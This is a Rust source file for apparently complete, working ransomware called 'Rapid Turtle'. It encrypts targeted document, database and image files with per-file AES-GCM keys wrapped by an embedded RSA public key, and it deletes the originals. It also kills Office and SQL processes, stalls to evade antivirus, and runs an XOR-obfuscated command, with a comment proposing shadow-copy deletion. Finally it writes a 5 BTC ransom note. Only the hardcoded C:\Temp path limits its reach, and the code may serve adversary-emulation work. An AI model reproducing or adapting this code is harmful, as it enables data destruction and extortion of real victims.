use aes_gcm::{Aes256Gcm, Key, Nonce, KeyInit, aead::Aead};
use rsa::{Pkcs1v15Encrypt, RsaPublicKey};
use rsa::pkcs8::DecodePublicKey;
use rand::{Rng, RngCore, thread_rng}; 
use rayon::prelude::*;
use walkdir::WalkDir;
use std::fs::{File};
use std::io::{Read, Write};
use std::process::Command;
use std::path::Path;
use std::time::Instant;
use std::hint::black_box;

// WinAPI imports
use windows_sys::Win32::System::Threading::CreateMutexW;
use windows_sys::Win32::Foundation::{GetLastError, ERROR_ALREADY_EXISTS, CloseHandle};

// basic config stuff
const RSA_PUBLIC_KEY_PEM: &str = r#"-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAkXBL8kffP+8k57CapwTa
9c6nXRjPGIW1xrE5AaqnQvx18sAqRB6/RcGm7afDuY3V3O7ZYEeT0ExqHLuDCXBd
RoT9UFvDAenYOcz+GcPAxkv9x5iCMSSBIe3ZJA99F//zdzD95gjETypFu56Cp152
o5ghjHyo0YKsxt3uGkcXC6c+Ga9KZO5fgxhCxDqwxN/bCJWMmCY5/bAKJDbAP4kX
8fHlpIE2UFqNGPb3BDiUa4TcLBlU/RmbL/b9ewwYGcULJSrctqNte0bWNQ/dbxLZ
3LOxRemPxWF4O1aU/lnaXLteYvZxPCsL89oMBKA2odbz9WwEaztvux8f1ZJoZUQv
QRNNk/zIvuYfYDf2Fxn8oqNq5tYrF5zrBTtv5pYIMhhfrdzuVxbgIam174stAa1Y
/MspD6lXqIxac5PBSlMxfXF+2ZkSdO9EZ638orb8pFAasb57VfrX6RveKVcpvMYf
h/TMoGDblJ3kT5sxRSJHdjt3cV6ARag5FsN57hh/y0nrcf+Xv8kyEkN50vqTh1ML
/yWEQYvr1bC0wYVPuLtpqiX6IhkU4kd7LoslG88l18fr02oxxlh9c6Nc8TK3j9m5
pjZ6SdxEBijvYsHZbY2vw85aKmVdsDodWhC4LTmYCXczaZKcH1NQLo2X5fbVxWrv
wZSidQGZ4W86PdpVdy49FYMCAwEAAQ==
-----END PUBLIC KEY-----"#;

const RANSOM_NOTE: &str = "ALL YOUR FILES ARE ENCRYPTED. Send 5 BTC to bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kygt080. Your ID: {id}";
const TARGET_EXTENSIONS: &[&str] = &["md","doc", "docx", "ppt", "pptx", "eml", "htm", "html", "pdf", "jpg", "jpeg", "png", "txt", "xlsx", "sql", "db", "ps1", "psm", "zip", "7z","csv","mov", "iso"];
const PROCESSES_TO_KILL: &[&str] = &["sqlservr.exe", "outlook.exe", "excel.exe","winword.exe", "vmtoolsd.exe", "olk.exe"];

// mutex for our instance
// use format --> b"Global\\PROG_Mutex_2804\0"
const MUTEX_NAME: [u16; 35] = [
    0x0047, 0x006C, 0x006F, 0x0062, 0x0061, 0x006C, 0x005C, 0x0053, 
    0x0069, 0x006E, 0x0073, 0x005F, 0x006F, 0x0066, 0x005F, 0x0054, 
    0x0068, 0x0065, 0x005F, 0x0046, 0x0061, 0x0074, 0x0068, 0x0065, 
    0x0072, 0x002D, 0x0044, 0x0052, 0x0046, 0x005F, 0x0031, 0x0038, 
    0x0031, 0x0038, 0x0000 
];

// XOR Key
const X_KEY: &[u8] = &[
    0xde, 0xad, 0xbe, 0xef, 
];

// busy work stuff
const INNER_ITERATIONS: i32 = 100_000;
const STALL_SECONDS: f64 = 32.0;

struct EncryptionEngine {
    pub_key: RsaPublicKey,
}

//
// target state of file post encryption:
//
// +-----------------------+
// | AES-GCM Ciphertext    |
// +-----------------------+
// | 12-byte Nonce         |
// +-----------------------+
// | RSA Encrypted AES Key |
// +-----------------------+
//
impl EncryptionEngine {
    fn new() -> Self {
        let pub_key = RsaPublicKey::from_public_key_pem(RSA_PUBLIC_KEY_PEM)
            .expect("Failure loading RSA Public Key. Check format.");
        Self { pub_key }
    }

    fn encrypt_file(&self, path: &std::path::PathBuf) -> std::io::Result<()> {
        // generate unique symmetric key and nonce for each file
        let mut symmetric_key = [0u8; 32];
        let mut nonce_bytes = [0u8; 12];
        thread_rng().fill_bytes(&mut symmetric_key);
        thread_rng().fill_bytes(&mut nonce_bytes);

        let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(&symmetric_key));
        let nonce = Nonce::from_slice(&nonce_bytes);

        // read in file contents
        let mut file = File::open(path)?;
        let mut buffer = Vec::new();
        file.read_to_end(&mut buffer)?;

        // encrypt contents
        let ciphertext = cipher.encrypt(nonce, buffer.as_ref())
            .map_err(|e| std::io::Error::other(e.to_string()))?;

        // protect symmetric key with our public key
        let mut rng = thread_rng();
        let encrypted_key = self.pub_key.encrypt(&mut rng, Pkcs1v15Encrypt, &symmetric_key)
            .map_err(|e| std::io::Error::other(e.to_string()))?;

        // write encrypted content + footer (nonce + encrypted key)
        // this is also where we define new file extension
        let new_filename = format!(
            "{}.hare",
            path.file_name()
                .unwrap()
                .to_string_lossy()
        );
        let mut out_file = File::create(path.with_file_name(new_filename))?;
        out_file.write_all(&ciphertext)?;
        out_file.write_all(&nonce_bytes)?; 
        out_file.write_all(&encrypted_key)?;
        out_file.sync_all()?;

        // delete original file
        std::fs::remove_file(path)?;
        Ok(())
    }
}

// mutex - return true for first, false if dupe
fn check_single_instance() -> bool {

    unsafe {
        // create mutex with given name
        let handle = CreateMutexW(std::ptr::null(), 0, MUTEX_NAME.as_ptr());
        
        if handle == 0 {
            return false; // failed mutex creation
        }

        if GetLastError() == ERROR_ALREADY_EXISTS {
            println!("[!] OG Turtle ONLY - Get off the track!");
            CloseHandle(handle);
            return false;
        }
        true
    }
}

// stall with busy work - intended to keep AV off our ass
// update STALL_SECONDS above to preferred length
fn race_preparations() -> f64 {
    let start = Instant::now();
    let mut result = 0.0;

    loop {
        for i in 0..INNER_ITERATIONS {
            let x = i as f64;
            result = black_box((x.sin() * x.cos()) / ((x + 1.0).tan() + 1.0));
        }

        let elapsed = start.elapsed().as_secs_f64();
        if elapsed >= STALL_SECONDS {
            break;
        }
    }

    result
}

// XOR-decode
fn xm_decode(input: &[u8], key: &[u8]) -> Vec<u8> {
    input
        .iter()
        .enumerate()
        .map(|(i, b)| b ^ key[i % key.len()])
        .collect()
}

// close down programs - remove potential file locks
fn system_sabotage() {
    for proc in PROCESSES_TO_KILL {
        let _ = Command::new("taskkill")
            .args(["/F", "/IM", proc])
            .output();
    }

    // currently pops a calc - can update to call whatever (i.e., vssadmin delete shadows /all /quiet)
    let e_command: &[u8] = &[
        0xbd, 0xcc, 0xd2, 0x8c, 0xf0, 0xc8, 0xc6, 0x8a,
    ];


    let decoded = xm_decode(e_command, X_KEY);
    let d_command = String::from_utf8_lossy(&decoded);

    //println!("Decoded command: {:?}", d_command);
    //println!("Decoded bytes: {:02X?}", decoded);
    
    // there may be a stealthier way to do this, but it works
    let _ = Command::new("cmd")
        .args(["/c", d_command.as_ref()])
        .output();
}

fn create_ransom_note(dir: &Path) {
    let victim_id = thread_rng().r#gen::<u32>();
    let note_content = RANSOM_NOTE.replace("{id}", &victim_id.to_string());
    let note_path = dir.join("READ_ME_TO_DECRYPT.txt");
    if let Ok(mut file) = File::create(note_path) {
        let _ = file.write_all(note_content.as_bytes());
    }
}

fn main() {
    // mutex check
    if !check_single_instance() {
        //println!("[Debug] Exiting from mutex func");
        std::process::exit(0);
    }

    println!("[...] Patience, Turtle is on their way...");

    let lacing_up = black_box(race_preparations());
    let _left_shoe = lacing_up;

    println!("[*] Starting shot fired! Loosing a Rapid Turtle...");
    
    //sabotage system recovery (pop calc currently)
    system_sabotage();

    println!("[...] False start, Turtle was sabotaged! \n[...] Wait for turtle to reset...");

    let _false_start = black_box(race_preparations());
    let _right_shoe = _false_start;

    let engine = EncryptionEngine::new();
    let root_dir = "C:\\Temp"; // CONTROL test location - DNFIU!!!!

    // multithread directory traversal and encryption == speed
    let files: Vec<_> = WalkDir::new(root_dir)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| {
            e.path().extension()
                .and_then(|s| s.to_str())
                .map(|ext| TARGET_EXTENSIONS.contains(&ext))
                .unwrap_or(false)
        })
        .collect();

    files.par_iter().for_each(|entry| {
        let path = entry.path().to_path_buf();
        if let Err(e) = engine.encrypt_file(&path) {
            eprintln!("Error with a participant {:?}: {}", path, e);
        }
    });

    // drop ransom note
    create_ransom_note(Path::new(root_dir));

    println!("[+] Rapid Turtle finished the race. You have lost!");
}
